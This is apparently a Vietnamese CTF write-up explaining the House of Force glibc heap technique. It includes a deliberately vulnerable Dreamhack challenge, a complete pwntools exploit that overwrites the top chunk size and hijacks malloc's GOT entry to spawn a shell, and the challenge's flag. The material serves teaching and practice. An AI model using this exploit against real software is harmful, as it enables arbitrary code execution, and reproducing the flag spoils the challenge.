# House of Force

- tiếp tục với series học heap thì hôm nay ta sẽ học 1 kĩ thuật mới khai thác heap đó là **House of Force**
- như chúng ta đã biết thì kĩ thuật **House of Spirit** được dùng để khai thác **fast bins**, còn với **House of Force** thì được dùng để khai thác **top chunks**, giúp ta có thể malloc trả về 1 địa chỉ mình muốn
- để hiểu rõ hơn thì mình cùng xem ví dụ dưới

## Example

```c 
int main()
{
long * ptr, * ptr2;
ptr = malloc (0x10);
ptr = (long *) (((long) ptr) +24);
*ptr=-1; // &lt;=== Change the size field of the top chunk to 0xffffffffffffffff
Malloc(-4120); // &lt;=== reduce the top chunk pointer
Malloc(0x10); // &lt;=== allocate blocks to implement arbitrary address writes
}
```

- đầu tiên thì ta khởi tạo cho ptr = malloc(0x10), lúc này heap sẽ như sau

```c 
0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr
0x602010: 0x0000000000000000 0x0000000000000000

0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk
0x602030: 0x0000000000000000 0x0000000000000000
```
- ta thấy size của top chunk hiện tại đang là 0x20fe1
- target là ta muốn đến là got&malloc(0x601020)

```c 
ptr = (long *) (((long) ptr) +24);
*ptr=-1;
```
- lúc này ta sẽ set cho size của top chunk = -1 => IOF xảy ra và size lúc này là 0xffffffffffffffff
- với chunk có size rất lớn như vậy thì hoàn toàn có thể bao phủ toàn bộ không gian bộ nhớ của chương trình, vượt qua vùng nhớ của heap
- addr top chunk hiện tại là 0x602020 + 0x10(heap metadata) = 0x602030
```c 
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000

0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000602020 &lt;=== top chunk at this point everything is fine
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```
- lúc này ta có muốn malloc sẽ trả về địa chỉ của got&malloc(0x601020) < 0x602030
- ta có công thức tính offset như sau:

```c
offset = target - top_chunk - 0x8 # 64bit
offset = target - top_chunk - 0x4 # 32bit
```
- 0x8 trong công thức là 8byte cho heap metadata của target
- áp dụng cho bài trên thì offset = 0x601020 - 0x602030 - 0x8

![image](https://github.com/gookoosss/CTF/assets/128712571/9a6b89fe-54e4-4c7c-b123-7a0626cd55b8)


- khi đó malloc(-4120) trên , heap lấy từ top chunk, lúc này  top chunk pointer sẽ thành địa chỉ got&malloc (0x601010 + 0x10)

```c
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000

0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000

0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000601010 &lt;=== It can be observed that the top chunk is raised
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```
- bây giờ ta chỉ cần malloc 1 size bất kì thì nó sẽ trả về địa chỉ của got&malloc(0x601020), lúc này ta có ow got và lấy shell

### Note:
- điều quan trọng nhất trong HOF là làm sao cho ow size của top chunk phải rất lớn , để có phân bổ ra là ngoài vùng địa chỉ heap
- offset có thể âm hoặc dương đều được, tùy vào địa chỉ ta muốn(thường libc sẽ dương, còn lại thì âm)
- target có thể là bất kì địa chi nào (on heap, stack, bss, etc)

### Reference

- dreamhack: https://learn.dreamhack.io/16#71
- heap-exploitation: https://heap-exploitation.dhavalkapil.com/attacks/house_of_force
- CTF Wiki EN: https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_force/

Bây giờ ta sẽ làm 1 chall về House of Force trên dream hack để hiểu rõ hơn

# house_of_force

![image](https://github.com/gookoosss/CTF/assets/128712571/382c35b2-be57-408b-b21e-441cb0d2875e)


## Source C 

```c 
// gcc -o force force.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

int *ptr[10];

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
	int size;

	if( cnt > 10 ) {
		return 0;
	}

	printf("Size: ");
	scanf("%d", &size);

	ptr[cnt] = malloc(size);

	if(!ptr[cnt]) {
		return -1;
	}

	printf("Data: ");
	read(0, ptr[cnt], size);

	printf("%p: %s\n", ptr[cnt], ptr[cnt]);
	return 0;
}

int write_ptr() {
	int idx;
	int w_idx;
	unsigned int value;

	printf("ptr idx: ");
	scanf("%d", &idx);

	if(idx > 10 || idx < 0) {
		return -1;
	} 

	printf("write idx: ");
	scanf("%d", &w_idx);

	if(w_idx > 100 || w_idx < 0) {
		return -1;
	}
	printf("value: ");
	scanf("%u", &value);

	ptr[idx][w_idx] = value;

	return 0;
}

void get_shell() {
	system("/bin/sh");
}
int main() {
	int idx;
	int cnt = 0;
	int w_cnt = 0;
	initialize();

	while(1) {
		printf("1. Create\n");
		printf("2. Write\n");
		printf("3. Exit\n");
		printf("> ");

		scanf("%d", &idx);

		switch(idx) {
			case 1:
				create(cnt++);
				cnt++;
				break;
			case 2:
				if(w_cnt) {
					return -1;
				}
				write_ptr();
				w_cnt++;
				break;
			case 3:
				exit(0);
			default:
				break;
		}
	}

	return 0;
}
```

## Analysis

- ta có 3 option create, write, exit
- create đơn giản là malloc và nhập data vào heap
- hàm write_ptr() cho phép ta thay đổi ptr, để ý thì thấy có bug OOB => có thể thay đổi size của top chunk
- có hàm get_shell và chall cho ta thêm địa chỉ heap => leak top chunk pointer
- nhìn qua thì ta đoán được bài này sử dụng HOF rồi

## Exploit

- đầu tiên leak địa chỉ top chunk 

```python 
add(0x8, b'a'*4)
heap = int(p.recvuntil(b':')[:-1], 16)
top = heap + 0x8 + 0x4 + 0x4
print(hex(top))
```

- sau đó thay đổi size của top chunk thành 0xfffffff

![image](https://github.com/gookoosss/CTF/assets/128712571/b7259cb5-d85a-4815-8342-f4125bc5f166)

- target của ta là got&malloc để ow plt thành get_shell, nên ta sẽ tính offset như sau: 

```c 
offset = exe.got.malloc - top - 0x4
```

- lúc này top chunk pointer đang trỏ đến target
- cuối cùng thì ta lấy shell thôi 

``` c
add(offset, b'a')
add(0x4, p32(exe.sym.get_shell))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', str(0x4))
p.interactive()
```

![image](https://github.com/gookoosss/CTF/assets/128712571/cd1f2437-a717-441a-afff-f98df93f860d)


## script 

```python
from pwn import *

p = process('./house_of_force')

# p = remote('host3.dreamhack.games', 14861)

exe = ELF('./house_of_force')

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def edit(idx, ptr, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'ptr idx: ', str(idx))
    p.sendlineafter(b'write idx: ', str(ptr))
    p.sendlineafter(b'value: ', str(data))

gdb.attach(p, gdbscript = '''
b*0x804887d
b*0x804872c
c
''')

input()
# 0x38

add(0x8, b'a'*4)
heap = int(p.recvuntil(b':')[:-1], 16)
top = heap + 0x8 + 0x4 + 0x4
print(hex(top))
edit(0, 3, -1)
offset = exe.got.malloc - top - 0x4
print(hex(offset))
print(hex(exe.got.malloc))
add(offset, b'a')
add(0x4, p32(exe.sym.get_shell))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', str(0x4))
p.interactive()

# DH{d351d8d936884dc4aaebb689e8a183b2}
```

## Flag

DH{d351d8d936884dc4aaebb689e8a183b2}






